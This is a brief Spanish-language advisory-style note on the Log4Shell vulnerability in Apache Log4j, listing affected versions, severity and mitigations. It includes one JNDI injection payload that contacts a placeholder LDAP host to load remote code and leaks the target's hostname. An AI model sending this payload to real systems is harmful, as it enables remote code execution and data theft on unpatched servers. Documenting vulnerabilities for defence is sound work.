# CVE-2021-44228 - Log4j RCE (Log4Shell)

## Información

| Campo      | Valor            |
|------------|------------------|
| CVE ID     | CVE-2021-44228   |
| Fecha      | 2021-12-09       |
| Severidad  | Crítico          |
| CVSS       | 10.0             |

## Descripción
Vulnerabilidad de ejecución remota de código en Apache Log4j.

## Sistemas Afectados
- Apache Log4j 2.0 - 2.14.1
- Aplicaciones Java que usan Log4j

## Payload

```
${jndi:ldap://${hostName}.example.com/Exploit}
```

## Mitigación
- Actualizar a Log4j 2.17.0
- Eliminar clase JndiLookup
- Usar `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`
